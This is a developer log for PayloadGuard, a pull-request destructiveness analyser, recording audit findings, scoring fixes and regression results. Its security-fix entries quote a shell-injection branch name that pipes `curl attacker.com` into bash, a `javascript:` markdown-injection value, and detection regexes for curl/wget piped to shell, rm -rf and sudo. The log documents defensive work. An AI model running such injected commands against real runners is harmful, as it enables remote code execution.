# PayloadGuard — Developer Log

Reverse-chronological. Most recent entry first.

## 2026-05-04 — Security Hardening (Marketplace Readiness Audit)

Full security audit of `action.yml`, `analyze.py`, `post_check_run.py`, and `structural_parser.py` against the threat model of an adversarial consumer repo and a misconfigured credential set. 14 findings identified and fixed in a single commit (`bd90052`). Test suite maintained at 166 pass / 7 skip throughout.

### CRITICAL fixes

**C1 — Shell injection (`action.yml`)**
`${{ github.head_ref }}` and `${{ github.base_ref }}` were interpolated directly into `run:` shell scripts. A branch named `$(curl attacker.com | bash)` would execute in the runner. Fixed by moving both values to `env:` declarations (`HEAD_REF`, `BASE_REF`) and referencing shell variables only. `git fetch origin "$BASE_REF:$BASE_REF"` also fixed.

**C2 — PEM validation (`post_check_run.py`)**
`if "-----BEGIN" not in key` accepted any string containing that substring, including truncated or corrupted keys. Replaced with a proper regex requiring a full BEGIN header, base64 body, and matching END footer.

**C3 — Markdown injection (`analyze.py`)**
`deleted_components` items from structural drift analysis were written directly to the GitHub PR comment body without escaping. A deleted function named `` `](javascript:alert(1)) `` would inject raw markdown. `_md_escape()` was already present in `format_markdown_report()` but not applied to component names or branch/target names. Applied to both.

### HIGH fixes

**H1 — URL injection (`post_check_run.py`)**
`GITHUB_REPOSITORY` and `PAYLOADGUARD_INSTALLATION_ID` were inserted into GitHub API URL paths without format validation. Added `re.fullmatch()` guards: `owner/repo` format for the repository, digits-only for the installation ID.

**H2 — Unbounded blob reads (`analyze.py`)**
`data_stream.read()` was called with no size argument in the structural drift loop (two calls) and in the added-file content scan. A PR adding or modifying a large file would OOM the runner. Added `_MAX_BLOB_BYTES = 1_048_576` constant; all three reads now cap at 1 MB.

**H3 — Private key exposure (`action.yml`)**
The `private-key` input was never masked. Added a "Mask secrets" step — the first `run:` step in the action — that calls `echo "::add-mask::$PAYLOADGUARD_PRIVATE_KEY"` before any Python runs.

**H4 — `repo_path` not normalised (`analyze.py`)**
`args.repo_path` was passed directly to `git.Repo()` without normalisation. Applied `os.path.realpath(os.path.abspath(repo_path))` at the CLI entry point.

### MEDIUM fixes

**M1 — ReDoS (`analyze.py`)**
`curl\b[^\n]*\|\s*(ba)?sh` and `wget\b[^\n]*\|\s*(ba)?sh` use unbounded `[^\n]*` before the pipe character. A line with many `|` characters triggers catastrophic backtracking. Rewritten as `.{0,200}` to bound the match window.

**M2 — Recursion guard (`structural_parser.py`)**
`ast.parse()` has no guard against deeply nested source code. `RecursionError` and `MemoryError` now caught and return an empty set rather than crashing the analysis.

**M3 — YAML schema validation (`analyze.py`)**
`load_config()` performed deep-merge but did not validate that merged values are the correct types. A string in a threshold list caused an opaque `TypeError` inside scoring. Added `isinstance` checks for all threshold keys; invalid values log a WARNING and fall back to defaults.

**M4 — Exception log sanitisation (`post_check_run.py`)**
The `__main__` exception handler printed `str(e)` unmodified. JWT library exceptions can embed PEM fragments. Messages containing `BEGIN`, `PRIVATE`, `KEY`, or `-----` are now redacted before printing to stderr.

### Marketplace compliance

Added `SECURITY.md` — required for GitHub Marketplace listing. Documents supported versions, vulnerability reporting path (GitHub Security Advisories), 5-day response SLA, and scope.

### Commits (analyser)
- `bd90052` — security: harden action, analyzer, and check-run poster for marketplace

### Documents updated
- `AUDIT_LOG.md` — new findings register for 2026-05-04 security audit run (14 findings, all fixed)
- `DEVLOG.md` — this entry
- `WHITEPAPER.md` — full rewrite to v1.2.0; security model section added; all layer descriptions updated

---

## 2026-05-04 — Org Migration, Harness Hardening, INC-1/INC-3/INC-4 Closed

### Org migration: darkvader-plg → payloadguard-plg

All references to `DarkVader-PLG` / `darkvader-plg` replaced across both repos after account loss required full org migration. The most critical fix was the test harness workflow (`uses:` reference) — GitHub Actions doesn't redirect after an org rename, silently preventing new workflow runs. PRs #29 and #33 cleared all stale references from harness and analyser respectively.

### GitHub Actions SHA-pinning (harness)

The `PayloadGuard-PLG` org policy requires all actions to be pinned to full commit SHAs. The harness workflow was using `@v6`, `@v7`, and `@main` — causing GitHub to silently reject new workflow runs without queuing them. All three action references SHA-pinned (PR #30). Added `continue-on-error: true` to the PayloadGuard Scan step to tolerate stale GitHub App credentials after org migration.

### Temporal group separation in regression runner (harness PR #31)

The 4 SAFE-expected test cases (T01/T02/T12/A10) will drift from SAFE → REVIEW after ~90 days due to branch age scoring. Added `temporal_group` field to `test_cases.json` (`aging` vs `stable`) and `--mode stable|temporal|full` to `run_regression.py`. Default mode runs 16 stable cases with strict pass/fail; temporal mode runs the 4 aging cases as longitudinal observation. `ingest.py` and `HARNESS.md` updated to match.

### INC-1 and INC-4 closed (PR #34)

Implemented `_scan_added_file_content()` in `analyze.py`. Scans added non-code files for CI trigger strings (`[citest`, `needs-ci`, `citest commit:`) and shell execution patterns (`curl|bash`, `sudo`, `chmod`, `rm -rf`, `setfacl`). Code and binary extensions skipped. Each flagged file contributes +2 to severity score (capped at +4). Report includes `content_flags` key and `🔬 Added File Content Scan` markdown section. 12 new tests, suite 151 → 163.

### INC-3 closed (PR #35)

When no PR description is provided and the changeset is non-trivial (verdict ≠ SAFE), `"No PR description — semantic transparency unverified"` is now injected into `verdict["flags"]`. Previously UNVERIFIED was silently swallowed. 3 new tests, suite 163 → 166.

### Commits (analyser)
- `92fc69e` — ci: continue-on-error for Post Check Run step
- `63df0ac` — Fix org references: darkvader-plg/DarkVader-PLG → payloadguard-plg/PayloadGuard-PLG
- `948a3b9` — feat: added file content scanning (INC-1, INC-4)
- `13cc624` — fix: surface UNVERIFIED semantic flag on non-trivial changesets (INC-3)

---

## 2026-05-03 — GitHub Actions Infrastructure Fix + v1.1.0 Release

Session focused on resolving CI startup failures caused by non-existent action version tags (@v6, @v9) and establishing v1.1.0 as the live release on main.

### Commits

- `d843549` — Update action.yml with specific version references (v5, v7 SHA pins)
- `a4b98bc` — Update actions versions in publish.yml workflow (v4, v5 SHA pins)
- `b138b92` — Update actions versions in payloadguard.yml workflow (v4, v5, v7 SHA pins)
- `29c5869` — Update handover: CI fix complete (SHA-pinned actions), main at d843549

### Issue: Non-existent Action Versions

The CI workflow files referenced action versions that do not exist:
- `actions/checkout@v6` (real latest: v4)
- `actions/setup-python@v6` (real latest: v5)
- `actions/github-script@v9` (real latest: v7)

This caused GitHub Actions startup to fail with "Action not found" errors on every PR.

### Fix: SHA-pinned Action Versions

All 7 action references across 3 files (payloadguard.yml, publish.yml, action.yml) replaced with full commit SHAs per `PayloadGuard-PLG` org policy:
---

2026-04-29 — AIntegrity Code Review: 5 Logic Defect Fixes + Incident Report Corrections
Session focused on resolving all valid defects identified in an external architectural review by AIntegrity, plus correcting the incident documentation from the 2026-04-24 session to accurately reflect what actually happened.

Commits (newest first)
6e8b335 — Fix 5 logic defects from AIntegrity code review (analyze.py + test_analyzer.py)
bbb1abb — Correct incident report: AI research tool context pollution, not adversarial attack
9adc710 — Fix incident report: correct attack chain attribution
370e2a2 — Document 2026-04-24 incident in AUDIT_LOG and WHITEPAPER
74386a1 — Fix 3.1/3.2: safe markdown truncation and cryptography import guard (post_check_run.py)
c911810 — Fix 2.1: JS/TS constant tracking (structural_parser.py)
AIntegrity Review — Valid Defects Addressed
AIntegrity's architectural review identified 5 logic defects. All 5 are fixed in this session. Two were assessed as invalid (addressed in review response).

Fix 1.1 — Cross-file aggregation false positive (analyze.py lines 563-581)
Bug: Cross-file structural aggregation used only absolute node count. Any 2+ files with combined 3 deletions triggered CRITICAL regardless of proportion.
Fix: Added cross-file ratio gate — both count AND ratio must exceed thresholds, mirroring the per-file dual-condition logic.

Fix 1.3 — Silent YAML config failures (analyze.py load_config)
Bug: Blanket except swallowed all YAML parse errors silently.
Fix: Catches yaml.YAMLError specifically, emits WARNING to stderr, falls back to defaults.

Fix 2.1 — JS/TS constant blindness (structural_parser.py)
Bug: variable_declarator branch only tracked arrow functions and function expressions. Const objects, auth literals, routing configs scored 0 structural deletion weight.
Fix: Removed value type check — any named variable declarator is now tracked.

Fix 3.1 — Markdown truncation corruption (post_check_run.py)
Bug: Hard slice at 65535 chars produced broken markdown tables and unclosed code fences.
Fix: _safe_truncate() helper cuts at last newline, closes open fences, appends truncation notice.

Fix 3.2 — Silent cryptographic dependency failure (post_check_run.py)
Bug: Missing cryptography package caused opaque ImportError inside JWT library, leaving PR Check Run permanently pending.
Fix: Explicit import guard at module top with clear error message and sys.exit(1).

New Tests (+4 classes, 133 passing, 7 skipped)
TestCrossFileAggregation — verifies Fix 1.1 dual-gate behaviour
TestMalformedConfigWarning — verifies Fix 1.3 stderr warning and default fallback
TestStructuralParserJSTS — verifies Fix 2.1 const/object/arrow detection in JS and TS
TestMarkdownTruncation — verifies Fix 3.1 safe truncation, fence closure, newline boundary
Incident Report Corrections (AUDIT_LOG.md + WHITEPAPER.md)
The 2026-04-24 incident was initially documented as a "Track 2 Adversarial Strike" based on NotebookLM's own post-incident analysis — which was itself a hallucination.

What actually happened: NotebookLM pulled in external sources (AE3GIS MDPI paper, GitHub issues, MCP docs) it could not segregate, causing identity hallucination — it described PayloadGuard as an ICS testbed. The repository owner committed a corrupted output to main without recognising it as hallucinated content. There was no external attacker.

AUDIT_LOG.md retitled to "AI Research Tool Context Pollution". WHITEPAPER.md §8.6 retitled and rewritten. INC-1 through INC-4 findings preserved unchanged — the detection gaps are real regardless of whether the cause is malicious or accidental.

---

## 2026-04-24 — Regression Tooling, Detection Calibration, and Scoring Fixes

Full-day session building a local regression harness, running the analyser against 18 adversarial test cases, identifying detection gaps through systematic analysis, and shipping five scoring fixes that raised the pass rate from ~4/18 to 17/18 at default thresholds.

### Commits (newest first)

- `2a84a35` — Show full timestamp with GitHub Actions link in Last Run card (test-harness)
- `2844ff6` — Sync simulate_verdict with current analyze.py scoring logic
- `a7cb6b7` — Fix pass rate metric to reflect latest run per test case
- `d36bf88` — Raise structural CRITICAL score +3→+5; add database file to critical patterns
- `917876a` — Fix unit test to match updated critical file deletion score (+1→+2)
- `5cc517f` — Improve detection: security files, distributed structural, rename diffs, config deletions
- `190b0db` — Fix expected verdicts for T09 and A10 (test-harness)

---

### Regression tooling — `payloadguard-test-harness`

Three tools added under `tools/`:

**`ingest.py`** — Pulls completed GitHub Actions workflow runs, downloads the `payloadguard-results` artifact from each, and writes normalised rows into a local SQLite database (`tools/db/results.db`). Idempotent via `INSERT OR IGNORE` on `workflow_run_id`. Tables: `scan_runs` (one row per scan), `structural_flags` (per-file L4 data), `expected_verdicts` (seeded from `test_cases.json`).

**`run_regression.py`** — Full regression cycle in one command. Reopens all 18 closed test PRs → polls GitHub Check Runs until every scan completes → closes all PRs → optionally chains to ingest. Polling filters stale check runs by comparing `started_at` against the reopen timestamp, so previous run conclusions don't satisfy the wait condition.

**`dashboard.py`** — Plotly Dash app (three tabs: matrix, history, threshold simulator). The simulator tab re-scores stored raw JSON reports using adjustable sliders for all key thresholds, showing how the pass/fail map shifts before touching any code. Loads at `http://127.0.0.1:8050`.

**`test_cases.json`** — 18 entries mapping branch names to test case metadata (id, category, expected verdict, expected exit code, description).

---

### Test case metadata corrections

Two entries in `test_cases.json` had wrong expected verdicts:

- **T09 (`semantic/no-description`)**: Was `expected_verdict: SAFE`. The branch actually deletes `database.py`. Corrected to `DESTRUCTIVE / exit_code 2`. The test validates that L5b `UNVERIFIED` status (no PR description) does not suppress a destructive overall verdict.
- **A10 (`adversarial/unicode-payload`)**: Was `expected_verdict: DESTRUCTIVE`. This is a robustness test — a minimal +4/-1 change with hostile Unicode in comments. The expected outcome is no crash and no false positive. Corrected to `SAFE / exit_code 0`.

---

### First regression baseline

After the tooling was wired up and the `payloadguard-report.json` artifact upload was confirmed working, the first full 18-case regression produced this baseline at default thresholds (DESTRUCTIVE ≥ 5):

| Result | Count |
|---|---|
| Correctly DESTRUCTIVE | 1 (T04 only) |
| Correctly SAFE | 4 (T01, T02, T12, A10) |
| Missed DESTRUCTIVE (CAUTION/REVIEW) | 13 |

Pass rate: ~28%. The scoring model was producing verdicts in the 2–4 range for most adversarial cases — real signals, but not reaching the DESTRUCTIVE threshold.

---

### Root cause analysis (round 1)

Per-case investigation identified five structural gaps:

**A02 — rename-smuggling (auth.py → identity.py, gutted contents)**
L4 structural loop only processed `change_type == 'M'` (modifications). File renames (`change_type == 'R'`) were invisible to AST diffing even when the content was completely replaced.

**A03 — slow-deletion (1 function removed from each of 5 files)**
L4 uses `structural_score = max(per_file_ratio)`. Five files each losing one function sit below the per-file ratio threshold (e.g. 10% each). No cross-file aggregation existed.

**A04 — addition-camouflage (300-line api.js addition + auth.py deletion)**
Deletion of `auth.py` matched `CRITICAL_PATH_PATTERNS` but only scored +1. The large addition diluted the deletion ratio. Net score: 2 (REVIEW). A security-critical file being deleted outright should carry a much heavier signal.

**A09 — config-only-deletion (settings.yml + requirements.txt deleted, 45 lines, 90%+ ratio)**
The 100-line `_RATIO_MIN_LINES` floor prevented ratio scoring from firing. Absolute line volume was below threshold even though the deletion ratio was extreme and the deleted files were infrastructure-critical.

**T09 — no-description (database.py deleted)**
`database.py` matched no pattern in `CRITICAL_PATH_PATTERNS`. No bonus was applied. Score came entirely from line count/ratio, landing at CAUTION (3) — short of DESTRUCTIVE (5).

---

### Scoring fixes (`5cc517f`, `917876a`)

**1. Security-critical file detection**
Added `_SECURITY_CRITICAL_PATTERNS` constant covering `auth*`, `security*`, `permission*`, `authorization*` files (`.py/.js/.ts`). Any deleted file matching this set adds **+5** to the severity score — immediately DESTRUCTIVE. Fixes A04 and similar addition-camouflage attacks.

**2. Rename diff coverage**
L4 structural loop condition changed from `change_type == 'M'` to `change_type in ('M', 'R')`. Renamed files now go through full AST diffing using their original and new blobs. Fixes A02.

**3. Cross-file structural aggregation**
After the per-file structural loop, if ≥ 2 files have structural flags and their combined deleted node count reaches `min_deleted_nodes`, `overall_structural_severity` is set to CRITICAL. Fixes A03 distributed deletion evasion.

**4. Ratio floor bypass**
`_RATIO_MIN_LINES` is now `0` when `critical_file_deletions > 0` (was always 100). A 45-line config deletion at 90% ratio carries a real signal when the deleted files are CI/auth/schema files. Fixes A09.

**5. Critical path file weight**
`critical_file_deletions > 0` weight raised from **+1** to **+2** (was already +2 for > 5). Uniform +2 regardless of count.

Result after these fixes: **12/18** passing.

---

### Root cause analysis (round 2)

Remaining failures after round 1: T05, T09, T11, A03, A05, A06.

For T05, T11, A03, A05: all had structural CRITICAL firing but scoring only +3, giving a total of 3 (CAUTION). Required +2 more to reach DESTRUCTIVE.

For T09: `database.py` not in `CRITICAL_PATH_PATTERNS`, so no critical-path bonus and `_RATIO_MIN_LINES` floor not bypassed.

For A06: every metric deliberately tuned just below its individual threshold. No single signal fires. No compound scoring exists. Known hard case.

---

### Scoring fixes (`d36bf88`)

**Structural CRITICAL weight: +3 → +5**
Per-case analysis confirmed that structural CRITICAL (≥ 20% AST node deletion AND ≥ 3 nodes) is a strong enough signal to warrant immediate DESTRUCTIVE on its own. Raising the weight from +3 to +5 fixes T05 (4 methods removed from auth.py), T11 (multilang structural deletions), A03 (cross-file aggregation triggers CRITICAL), and A05 (Auth class shell preserved, all methods deleted). Safe baseline tests (T01, T02, T12) confirmed unaffected.

**`database[^/]*\.(py|js|ts)` added to `CRITICAL_PATH_PATTERNS`**
Database layer file deletions now qualify as critical-path files, triggering the +2 weight and the `_RATIO_MIN_LINES = 0` bypass. Combined with the existing 90%+ ratio signal on T09's diff, this pushes the score to DESTRUCTIVE. Fixes T09.

Result after these fixes: **17/18** passing. Only A06 (threshold-gaming) remains — a known limitation of purely individual-threshold scoring.

---

### Dashboard fixes

**Pass rate metric** changed from all-time historical average (63% across all regression rounds including early sessions with old code) to latest run per test case (94% = 17/18). The summary card now reflects current detection capability.

**`simulate_verdict`** rewritten to match the current `analyze.py` scoring exactly: structural +5, critical files +2 flat, `_RATIO_MIN_LINES` bypass, security file +5, cross-file aggregation. The simulator was previously diverging from actual CI results, making threshold exploration misleading.

**Last Run card** now shows `YYYY-MM-DD HH:MM` (full timestamp, not date only) and the value is a hyperlink to the specific GitHub Actions workflow run that produced the data. Commit `2a84a35` (test-harness PR #26).

---

### Final state

| Test case | Category | Verdict | Pass |
|---|---|---|---|
| T01 safe/small-additive | safe | SAFE | ✅ |
| T02 safe/docs-only | safe | SAFE | ✅ |
| T12 safe/large-rename | safe | SAFE | ✅ |
| T03 destructive/mass-deletion | destructive | DESTRUCTIVE | ✅ |
| T04 destructive/april-2026-replica | destructive | DESTRUCTIVE | ✅ |
| T05 boundary/structural-threshold | boundary | DESTRUCTIVE | ✅ |
| T09 semantic/no-description | semantic | DESTRUCTIVE | ✅ |
| T10 semantic/honest-critical | semantic | DESTRUCTIVE | ✅ |
| T11 multilang/structural-js-ts-go | multilang | DESTRUCTIVE | ✅ |
| A01 adversarial/keyword-evasion | adversarial | DESTRUCTIVE | ✅ |
| A02 adversarial/rename-smuggling | adversarial | DESTRUCTIVE | ✅ |
| A03 adversarial/slow-deletion | adversarial | DESTRUCTIVE | ✅ |
| A04 adversarial/addition-camouflage | adversarial | DESTRUCTIVE | ✅ |
| A05 adversarial/nested-gutting | adversarial | DESTRUCTIVE | ✅ |
| A07 adversarial/new-file-replacement | adversarial | DESTRUCTIVE | ✅ |
| A09 adversarial/config-only-deletion | adversarial | DESTRUCTIVE | ✅ |
| A10 adversarial/unicode-payload | adversarial | SAFE | ✅ |
| A06 adversarial/threshold-gaming | adversarial | SAFE | ❌ |

---

## 2026-04-23 — Audit Hardening Session

Full-day session working through the internal audit (`AUDIT.md`). The audit identified 42 findings across six categories. Today's session addressed 18+ of them across four commits, followed by report contextualisation and the PEM key validation fix.

### Commits (newest first)

- `7307093` — Validate PEM key format before jwt.encode() (§5.4)
- `3cbfd66` — Add contextual interpretation to markdown report sections
- `e111ce9` — Audit hardening: 18 fixes across detection, scoring, security, and test coverage
- `607ed0c` — Harden scoring model and fix detection gaps (§3.1, §3.2, §2.6, §5.3, §6)
- `6d188a2` — Audit hardening — HIGH/MEDIUM fixes (round 1)

---

### Round 1 — HIGH/MEDIUM fixes (`6d188a2`)

**§1.1 / §2.2 / §4.3 — Binary file deletions + memory exhaustion (HIGH)**

Bug: `analyze.py` lines 418–433 read every added/deleted file blob into memory (`data_stream.read()`) and counted newlines manually. Binary files silently decode with `errors='ignore'` and contribute 0 to `lines_deleted`, meaning a PR that deletes large compiled libraries or key files gets no line-count penalty. A single 1 GB file would OOM the runner.

Fix: Replaced the entire manual blob-reading path with `git --numstat`. Git's own output gives integer `added`/`deleted` counts per file (including binary files, which git reports as `-`/`-`); binary entries are counted as 1 line each. Three issues fixed in one change.

**§2.5 — Malformed `payloadguard.yml` crashes analysis (MEDIUM)**

Bug: `yaml.safe_load()` in `analyze.py` line 327 had no try/except. A config file with tabs, wrong types, or truncated YAML raised an uncaught exception and killed the entire run.

Fix: Wrapped `yaml.safe_load()` in try/except; on any `yaml.YAMLError` the loader logs a warning and falls back to defaults, keeping the run alive.

**§5.1 — Partial env var validation in `post_check_run.py` (MEDIUM)**

Bug: `app_id` was checked for presence; `private_key`, `installation_id`, `head_sha`, and `GITHUB_REPOSITORY` were accessed with bare `os.environ[]` — a `KeyError` on any missing variable was swallowed by the outer try/except with no indication of which variable failed. `int(os.environ.get("PAYLOADGUARD_EXIT_CODE", "1"))` raised `ValueError` on non-integer input.

Fix: Added `_require_env(name)` helper that raises `EnvironmentError` with the variable name in the message. Applied to all required variables. `exit_code` parse wrapped in try/except with a sensible fallback.

**§5.2 — Report file path not validated as regular file (MEDIUM)**

Bug: `post_check_run.py` opened `report_path` with no check that it was an actual file. A symlink or named pipe would read unexpected content or hang.

Fix: Added `os.path.isfile(report_path)` guard; non-regular paths raise `EnvironmentError` before the `open()`.

**§4.5 — No retry on GitHub API call in `post_check_run.py`**

Bug: A single `requests` call with `timeout=15`. Any transient GitHub API failure silently dropped the Check Run result.

Fix: Added `requests.Session` with `HTTPAdapter(max_retries=Retry(3, backoff_factor=1, status_forcelist=[502, 503, 504]))`.

**§2.1 — Negative branch age (MEDIUM)**

Bug: `analyze.py` lines 471–475 computed `days_old = (target_date - branch_date).days`. If the branch was newer than the target date, this went negative and `TemporalDriftAnalyzer.analyze_drift()` raised `ValueError` at line 166, caught as a generic exception.

Fix: Clamped `days_old = max(0, (target_date - branch_date).days)`. A branch newer than target is treated as age 0.

**Test infrastructure update**: Updated `_setup_repo` in `test_analyzer.py` to mock `repo.git.diff` with numstat-format output so all existing line-count tests continue to pass against mock repos.

---

### Round 2 — Scoring model and detection gaps (`607ed0c`)

**§3.1 — Correlated signals double-count risk (HIGH)**

Bug: `analyze.py` lines 564–648 awarded independent points for file count, deletion ratio, and line count — three highly correlated signals. A legitimately large cleanup PR could hit DESTRUCTIVE (9+ points) before any structural signals fired.

Fix: The three deletion signals (file count, ratio, lines deleted) are now scored independently then capped: `score = max(individual_scores) + 1` if two or more fire, hard-capped at 4 points total. No single PR can reach DESTRUCTIVE on numbers alone.

**§3.2 — No weighting for code importance (HIGH)**

Bug: `analyze.py` lines 490–494 scored all deleted files equally unless they matched `CRITICAL_PATH_PATTERNS`. Deleting `security/auth.py` (not matching any pattern) was treated identically to deleting a comment-only config file.

Fix: `CRITICAL_PATH_PATTERNS` check now runs before the verdict call; the count of critical file deletions is passed to `_assess_consequence()`. More than 5 critical file deletions adds +2 points; any critical file deletions add +1 point.

**§2.6 — Threshold order not validated (LOW)**

Bug: `analyze.py` lines 307–315 accepted user config like `branch_age_days: [365, 90, 180]` (wrong order) and produced nonsensical tier comparisons.

Fix: Threshold lists loaded from user config are sorted ascending after merge, so out-of-order values are silently corrected.

**§5.3 — Markdown report contains unescaped filenames (LOW–MEDIUM)**

Bug: `analyze.py` lines 748–891 interpolated filenames directly into markdown: `` f"| `{ff['file']}` | ... |" ``. A filename with backticks or pipe characters malformed the table; a controlled filename in a malicious repo scan could inject markdown.

Fix: Added `_md_escape(s)` helper that escapes backticks and pipe characters. Applied to all filename interpolations in `format_markdown_report()`.

**§6 — Test coverage (+18 tests)**

Added test coverage for: binary file deletion, negative branch age, malformed YAML config, threshold order validation, critical path scoring, markdown filename escaping, and `post_check_run._require_env`.

---

### Round 3 — 18-fix consolidation commit (`e111ce9`)

This was a merge of four sub-commits addressing remaining HIGH/MEDIUM items.

**§3.4 — Deletion ratio semantically ambiguous (MEDIUM)**

Bug: Ratio = `deleted / (added + deleted)`. A PR adding 10 lines and deleting 5 reads as 33% (flagged CAUTION). A PR adding 50,000 and deleting 5,000 reads as 9% (fine). The ratio flagged proportional churn, not absolute destructiveness.

Fix: The ratio gate now only fires when `lines_deleted >= 100`. A 10-line PR with a 33% ratio is no longer flagged.

**§2.4 — `iter_commits()` loads everything into memory (MEDIUM)**

Bug: `analyze.py` lines 372–374: `commits = list(self.repo.iter_commits(ref, since=since.isoformat()))` — on repos with millions of commits this loaded the entire result into a Python list.

Fix: Added `max_count=1000` to `iter_commits()` calls in the velocity window to cap memory use.

**§5.5 — Timestamp truncation loses timezone in report (LOW)**

Bug: `analyze.py` line 889: `ts = report.get('timestamp', '')[:16].replace('T', ' ')` stripped timezone and truncated to minute precision.

Fix: Timestamp generation switched to `datetime.now(timezone.utc)`; markdown rendering preserves seconds precision and appends a `UTC` suffix.

**§1.6 — Non-top-level structural deletions missed (MEDIUM–HIGH)**

Bug: `structural_parser.py` lines 127–152 only tracked top-level functions and classes. Deleting constants, annotated assignments, or module-level helpers was invisible to Layer 4.

Fix: `structural_parser.py` now tracks module-level named assignments (`assignment`, `augmented_assignment`) and annotated assignments (`annotated_assignment`) in Python, so `SECRET_KEY = '...'` and `MAX_RETRIES: int = 5` are visible to Layer 4. Rust rules extended with `const_item` and `static_item`; Go rules extended with `const_spec`. +5 tests covering constant extraction and structural detection of deleted constants.

**§1.2 — Merge commits / wrong diff base (MEDIUM)**

Bug: `merge_base()` can return multiple commits for complex histories. Code assumed `[0]` is always the correct fork point; unrelated histories returned an empty list, causing an `IndexError`.

Fix: `merge_base()` result is now checked for empty list; if empty, the analysis returns a structured error (`"unrelated_histories"`) rather than raising.

**§4.1 — Commit author and message data ignored**

GitPython's `commit.author` and `commit.message` were available but never consulted.

Fix: Added `_COMMIT_RED_FLAG_PATTERNS` constant (covering patterns like `remove all tests`, `disable auth`, `bypass security`, `drop database`). Up to 50 commits between merge base and branch tip are scanned; flagged commits are surfaced in `commit_flags` key, printed in the terminal report, and included in the markdown report as advisory signals (no score impact).

+3 tests: empty merge_base error, `commit_flags` key present in result, red-flag commit message detected and surfaced correctly.

**§1.5 — File permission / mode changes not detected (MEDIUM)**

Bug: GitPython's diff API includes `a_mode`/`b_mode` fields for permission changes (e.g. making a script executable). Completely ignored.

Fix: Diff objects are now scanned for `a_mode`/`b_mode` mismatches. Files where the `b_mode` gains executable bits (`& 0o111`) are surfaced in `permission_changes` in the result and printed in the terminal report. +1 test covering executable permission change detection.

**§1.3 — Symlinks and submodules not handled (MEDIUM)**

Bug: Symlinks (mode `0o120000`) and submodules/gitlinks (mode `0o160000`) appeared as regular file changes with no special handling.

Fix: Diff mode bits are inspected for these special values; both are surfaced in `special_files` in the result with file path, type, and change type.

---

### Report contextualisation (`3cbfd66`)

Each section of the markdown report was augmented with three layers of human context:

1. A one-liner explaining what the layer measures and why it matters.
2. Plain-English interpretation of the numbers (e.g. "Branch is 5 days old — context is fresh" rather than just "5 days").
3. Threshold context inline where relevant (e.g. the deletion ratio section shows the CAUTION and REVIEW thresholds so reviewers can see how far from a flag the PR is).

Additional changes: net change now renders as a signed `+/-` value; the deleted files section labels critical-path matches with a note explaining what patterns triggered; the commit message flags section explains what patterns were scanned.

---

### PEM key validation (`7307093`)

**§5.4 — No private key format validation before JWT signing (LOW)**

Bug: `post_check_run.py` lines 24–29 passed `PAYLOADGUARD_PRIVATE_KEY` directly to `jwt.encode()`. A malformed key (missing PEM header/footer) produced a cryptic Rust-level crypto panic that gave no indication of what was wrong.

Fix: Added an upfront check that the key value contains `-----BEGIN RSA PRIVATE KEY-----` (or the PKCS#8 equivalent); if not, `EnvironmentError` is raised with a clear message before the key reaches `jwt.encode()`.

---

## 2026-04-22 / Pre-Audit — Infrastructure, PyPI, README, and Audit Doc

### Test harness wiring (payloadguard-test-harness repo)

Installed the PayloadGuard GitHub App on the `payloadguard-test-harness` repository. Configured three repository secrets: `PAYLOADGUARD_APP_ID`, `PAYLOADGUARD_PRIVATE_KEY`, and `PAYLOADGUARD_INSTALLATION_ID`. Added a workflow file using the composite GitHub Action so that any PR to the test-harness repo triggers a PayloadGuard analysis and posts the result as a Check Run.

### PyPI name clash — renamed to `payloadguard-plg`

The package name `payloadguard` was already taken on PyPI by an unrelated project. Renamed the package to `payloadguard-plg` in `pyproject.toml`, updated all install instructions, and published v1.0.2.

### README rewrite

Rewrote the opening section of `README.md` to explain what PayloadGuard actually does rather than opening with implementation detail. Added a five-layer summary table mapping each layer to what it detects (temporal drift, volume signals, deletion ratio, structural AST changes, pattern matching), a verdict scale explanation (SAFE / CAUTION / REVIEW / DESTRUCTIVE), and a CI integration quickstart.

### Internal audit document (`AUDIT.md`)

Generated a full internal audit covering 42 findings across six categories: detection gaps (§1.1–§1.7), brittle logic (§2.1–§2.6), scoring model weaknesses (§3.1–§3.5), available-but-unused capabilities (§4.1–§4.5), security issues (§5.1–§5.5), and test coverage gaps (§6). Committed as `AUDIT.md` with the note "temporary — delete after review."
